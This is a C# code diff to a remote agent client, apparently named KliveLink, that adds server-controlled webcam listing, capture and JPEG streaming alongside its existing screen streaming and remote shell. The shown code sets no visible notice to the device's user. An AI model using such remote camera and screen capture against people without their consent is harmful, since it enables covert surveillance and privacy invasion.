@@ -15,6 +15,7 @@ public sealed class KliveLinkV2Client : IDisposable
     private readonly string? _pinSha256;
     private readonly V2CommandDispatcher _dispatcher;
     private readonly ScreenCaptureService _screenCapture;
+    private readonly CameraCaptureService _cameraCapture;
     private readonly SemaphoreSlim _sendLock = new(1, 1);
     private readonly SemaphoreSlim _commandSlots = new(4, 4);
     private readonly SemaphoreSlim _collectGate = new(1, 1);
@@ -43,7 +44,7 @@ public sealed class KliveLinkV2Client : IDisposable
 
     public KliveLinkV2Client(string serverUri, string agentId, string token,
         V2CommandDispatcher dispatcher, ScreenCaptureService screenCapture, string? pinSha256 = null,
-        V2CollectionTier autoTier = V2CollectionTier.T1)
+        V2CollectionTier autoTier = V2CollectionTier.T1, CameraCaptureService? cameraCapture = null)
     {
         _serverUri = serverUri;
         _agentId = agentId;
@@ -52,7 +53,9 @@ public sealed class KliveLinkV2Client : IDisposable
         _autoTier = autoTier;
         _dispatcher = dispatcher;
         _screenCapture = screenCapture;
+        _cameraCapture = cameraCapture ?? new CameraCaptureService();
         _screenCapture.OnFrameCaptured += frame => _ = SendScreenFrameAsync(frame);
+        _cameraCapture.OnFrameCaptured += frame => _ = SendCameraFrameAsync(frame);
     }
 
     public async Task ConnectAsync(CancellationToken cancellationToken = default)
@@ -262,6 +265,28 @@ public sealed class KliveLinkV2Client : IDisposable
                 case V2CommandOperation.ScreenStop:
                     _screenCapture.StopCapture();
                     await SendFrameAsync(V2FrameType.StreamEnd, new V2StreamEnd { StreamId = 1 }, CancellationToken.None);
+                    result = Ok(command, new { stopped = true });
+                    break;
+                case V2CommandOperation.CameraList:
+                    result = Ok(command, _cameraCapture.ListCameras());
+                    break;
+                case V2CommandOperation.CameraStart:
+                    var cameraRequest = Read<V2CameraStartRequest>(payload);
+                    var cameraStart = _cameraCapture.Start(cameraRequest);
+                    if (cameraStart.Started)
+                        await SendFrameAsync(V2FrameType.StreamOpen, new V2StreamOpen
+                        {
+                            StreamId = 2,
+                            Kind = "camera",
+                            Metadata = V2Json.Serialize(new { cameraIndex = cameraRequest.CameraIndex }),
+                        }, CancellationToken.None);
+                    result = cameraStart.Started
+                        ? Ok(command, new { started = true, streamId = 2 })
+                        : new V2Result { CommandId = command.CommandId, Status = V2CommandStatus.Failed, Error = cameraStart.Error };
+                    break;
+                case V2CommandOperation.CameraStop:
+                    _cameraCapture.Stop();
+                    await SendFrameAsync(V2FrameType.StreamEnd, new V2StreamEnd { StreamId = 2 }, CancellationToken.None);
                     result = Ok(command, new { stopped = true });
                     break;
                 case V2CommandOperation.ShellOpen:
@@ -536,6 +561,27 @@ public sealed class KliveLinkV2Client : IDisposable
         catch { }
     }
 
+    private async Task SendCameraFrameAsync(CameraFrame frame)
+    {
+        if (!IsConnected) return;
+        try
+        {
+            await SendFrameAsync(V2FrameType.StreamData, new V2StreamData
+            {
+                StreamId = 2,
+                Base64 = Convert.ToBase64String(frame.Jpeg),
+                Metadata = JsonSerializer.Serialize(new
+                {
+                    width = frame.Width,
+                    height = frame.Height,
+                    cameraIndex = frame.CameraIndex,
+                    at = DateTimeOffset.UtcNow,
+                }, V2Json.Options),
+            }, _cts?.Token ?? CancellationToken.None);
+        }
+        catch { }
+    }
+
     private async Task SendResultAsync(V2Result result)
     {
         await SendFrameAsync(V2FrameType.Result, result, _cts?.Token ?? CancellationToken.None);
@@ -581,6 +627,7 @@ public sealed class KliveLinkV2Client : IDisposable
         _shell?.Stop();
         _cts?.Cancel();
         _screenCapture.Dispose();
+        _cameraCapture.Dispose();
         _socket?.Dispose();
     }
 }
